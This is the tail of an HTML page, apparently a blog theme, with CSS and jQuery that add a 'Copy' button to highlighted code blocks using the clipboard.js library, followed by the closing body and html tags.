    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>